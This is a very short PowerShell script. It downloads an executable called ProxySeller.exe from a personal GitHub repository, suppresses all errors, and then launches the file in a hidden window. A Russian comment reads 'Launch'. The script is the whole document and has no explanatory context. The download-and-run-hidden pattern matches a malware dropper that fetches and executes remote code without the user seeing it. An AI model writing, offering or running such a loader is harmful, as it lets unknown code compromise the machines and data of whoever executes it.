Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/ProxySeller.exe" -OutFile "ProxySeller.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "ProxySeller.exe" -WindowStyle Hidden












